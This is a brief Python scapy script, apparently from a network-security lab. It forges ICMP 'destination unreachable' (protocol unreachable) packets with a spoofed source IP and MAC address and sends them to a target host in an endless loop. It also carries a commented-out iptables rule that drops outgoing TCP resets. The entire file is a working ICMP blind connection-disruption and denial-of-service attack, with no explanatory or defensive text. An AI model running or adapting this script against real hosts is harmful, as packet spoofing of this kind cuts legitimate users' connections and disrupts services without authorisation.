import sys
import os
from scapy.all import *


def main():
	
	src_ip="192.168.56.102"
	dest_ip="192.168.56.103"
	src_mac="08:00:27:1A:C1:21"
	dest_mac="08:00:27:36:72:04"
	send_icmpBlind_packet(src_ip,dest_ip,src_mac,dest_mac)

	
		
	       


def send_icmpBlind_packet(src_ip,dest_ip,src_mac,dest_mac):
	eth_h=Ether(src=src_mac,dst=dest_mac)
	ip_h=IP(dst=dest_ip,src=src_ip)
	icmp_h=ICMP(type=3,code=2)
	pkt=eth_h/ip_h/icmp_h
	sendp(pkt,iface="eth13") 


#os.system(iptables -A OUTPUT -p TCP --tcp-flags RST RST -j DROP) 
while 1:
	main()
